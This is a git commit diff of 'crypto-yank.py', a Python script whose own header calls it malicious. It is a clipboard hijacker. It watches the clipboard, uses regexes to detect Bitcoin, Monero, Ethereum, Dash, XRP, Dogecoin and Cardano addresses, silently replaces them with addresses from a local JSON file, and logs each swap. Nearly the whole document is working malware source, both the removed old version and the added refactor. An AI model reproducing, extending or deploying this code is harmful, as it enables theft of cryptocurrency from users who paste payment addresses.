16dd1927878b4c73d58d57189dee52e26fe4d052
jacques-andre <jacquesandre@mailbox.org>
2021-02-18 14:53:00 +0000

    Major refactoring, support for Cardano

--- crypto-yank.py
+++ crypto-yank.py
@@ -1,89 +1,69 @@
+# Warning! This code is malicious, I take 0 responsibility for misuse.
+# Created By github.com/jacques-andre
+# Function Definitions:
+# sniff -  go through regex_matches and find if clipboard contains any crypto if so: return what crypto
+# replace - load in crypto addresses from json file and replace clipboard
+
 import pyperclip
-import re
-import argparse
 import json
 import time
-import sys
-import pprint
+import re
+import argparse
 from datetime import datetime
 
+# DEV
+import pprint
+
 parser = argparse.ArgumentParser(
-    description="Replace crypto addresses in clipboard with your own"
+    description="Replace crypto-addresses in clipboard with your own"
 )
-parser.add_argument("--verbose", help="Get more details", action="store_true")
-parser.add_argument("--log", help="Logs output to log.txt", action="store_true")
-# parser.add_argument("--log", help="Log actions to log.txt", action="store_true")
-args = parser.parse_args()
+parser.add_argument("--log", help="log output to log.json", action="store_true")
 
-with open("addresses.json") as f:
-    addresses = json.load(f)
-    if addresses["legacy_btc"] == "NULL" and addresses["segwit_btc"] == "NULL":
-        print("BTC address can't be set to null!")
-        sys.exit()
-    elif addresses["legacy_btc"] == "NULL" or addresses["segwit_btc"] == "NULL":
-        print("BTC address can't be set to null!")
-        sys.exit()
+def main():
+    while 1:
+        now = datetime.now()
+        current_time = now.strftime("%d/%m/%Y %H:%M:%S")
 
-with open("addresses.json") as f:
-    loaded_addresses = json.load(f)
-if args.verbose:
-    print(f"Loaded in the following (IGNORING NULL): ")
-    pprint.pprint(loaded_addresses)
+        time.sleep(0.4)
+
+        user_clipboard = pyperclip.paste()
+        crypto_found = sniff(user_clipboard)
+        replacement_address = replace(user_clipboard,crypto_found)
+
+        log(now,crypto_found,user_clipboard,replacement_address)
 
 
-def parse_clip(clipboard):
-    global loaded_addresses
-    cryptos = {
-        "legacy_btc": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
-        "segwit_btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
+def replace(user_clipboard,  crypto_found):
+    with open('addresses.json') as json_file: 
+        master_addresses = json.load(json_file)
+
+    if crypto_found != 0:
+            pyperclip.copy(master_addresses[crypto_found])
+            return str(master_addresses[crypto_found])
+    return 0
+       
+
+def sniff(user_clipboard):
+    crypto_regex_match = {
+        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
         "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
         "eth": "^0x[a-fA-F0-9]{40}$",
         "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
-        "ripple": "^r[0-9a-zA-Z]{24,34}$",
-        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
+        "xrp": "^r[0-9a-zA-Z]{24,34}$",
+        "dodge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
+        "ada": "^D[A-NP-Za-km-z1-9]{35,}$"
     }
-    if len(clipboard) >= 100:
-        # Clipboard is too long... doing nothing
-        return False
 
-    for k, v in cryptos.items():
-        if bool(re.search(v, clipboard)) and loaded_addresses[k] != "NULL":
-            if args.verbose:
-                print(f"Found {k}")
-            return k
-    return False
+    for k, v in crypto_regex_match.items():
+        if bool(re.search(v, user_clipboard)):
+            return str(k)
 
+    return 0
 
-def replace_clip(clipboard, crypto):
-    global loaded_addresses
-    if loaded_addresses[crypto] != "NULL":
-        clipboard = loaded_addresses[crypto]
-    return clipboard
+def log(current_time,crypto_found,user_clipboard,replacement_address):
+    if crypto_found != 0:
+        with open("log.txt", "a+") as log:
+            log.write("[" + str(current_time) + "]: " + str(crypto_found.upper()) +  " in clipboard " + "(" + str(user_clipboard) + ") " + "replacing with -> "+ str(replacement_address) + "\n")
 
 
-def log(clipboard, replace, time):
-    with open("log.txt", "a+") as log:
-        log.write("(" + time + ") " + clipboard + "-> " + replace + "\n")
-
-
-def main():
-    now = datetime.now()
-    current_time = now.strftime("%d/%m/%Y %I:%M %p")
-    global loaded_addresses
-    current_clipboard = pyperclip.paste()
-    crypto_found = parse_clip(current_clipboard)
-    if crypto_found != False:
-        # if there is a crypto found replace else return original
-        replacement = replace_clip(current_clipboard, crypto_found)
-        if args.verbose:
-            print(f"{pyperclip.paste()} -> {replacement}")
-        if args.log:
-            log(pyperclip.paste(), replacement, current_time)
-        pyperclip.copy(replacement)
-    else:
-        pyperclip.copy(current_clipboard)
-
-
-while True:
-    time.sleep(0.4)
-    main()
+main()
